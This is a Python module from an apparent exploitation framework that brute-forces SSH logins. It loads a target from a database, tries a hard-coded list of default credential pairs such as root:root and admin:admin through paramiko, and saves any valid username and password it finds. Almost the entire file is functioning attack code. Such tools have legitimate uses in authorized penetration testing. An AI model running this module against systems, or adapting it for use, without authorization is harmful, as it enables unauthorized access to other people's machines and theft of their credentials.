
import paramiko
from utils import log_message
import database as db
from modules.base_module import ExploitationModule

class SshBruteforcerModule(ExploitationModule):
    def __init__(self):
        super().__init__()
        self.name = "SSH Bruteforcer"
        self.description = "Attempts to brute-force SSH using a list of common credentials."
        # A real list would be much larger and managed externally
        self.credentials = [
            ("root", "root"),
            ("root", "password"),
            ("root", "admin"),
            ("admin", "admin"),
            ("admin", "password"),
            ("user", "user"),
            ("test", "test"),
        ]

    def run(self, target_id):
        """
        Attempts to exploit WEAK_SSH_CREDENTIALS vulnerabilities.
        """
        target = db.get_target_by_id(target_id)
        if not target:
            return {"status": "failure", "reason": "target_not_found"}

        host = target['hostname']
        vulns = db.get_potential_vulnerabilities(target_id)
        ssh_vuln = next((v for v in vulns if v['type'] == "WEAK_SSH_CREDENTIALS"), None)

        if not ssh_vuln:
            return {"status": "failure", "reason": "no_vulns_for_this_module"}

        log_message("info", f"[{self.name}] Starting SSH brute-force attack on {host}.")

        for user, password in self.credentials:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=22, username=user, password=password, timeout=5)
                
                # If we get here, the login was successful
                log_message("critical", f"[{self.name}] SUCCESS! Found valid SSH credentials for {host}: {user}:{password}")
                
                # Store the found credentials
                db.add_credentials(
                    target_id=target_id,
                    service="ssh",
                    username=user,
                    password=password,
                    source=self.name
                )
                
                # Mark the vulnerability as confirmed
                db.update_vulnerability_status(ssh_vuln['id'], 'confirmed')
                
                ssh.close()
                return {"status": "success"}

            except paramiko.AuthenticationException:
                # This is the expected failure case
                log_message("debug", f"[{self.name}] Failed login on {host} with {user}:{password}")
                continue
            except Exception as e:
                # Other errors (e.g., connection refused, timeout)
                log_message("error", f"[{self.name}] An error occurred connecting to {host}: {e}")
                db.update_vulnerability_status(ssh_vuln['id'], 'failed')
                return {"status": "failure", "reason": "connection_error"}
        
        # If we finish the loop without success
        log_message("warning", f"[{self.name}] Brute-force attack on {host} finished. No valid credentials found.")
        db.update_vulnerability_status(ssh_vuln['id'], 'failed')
        return {"status": "failure", "reason": "no_creds_found"}
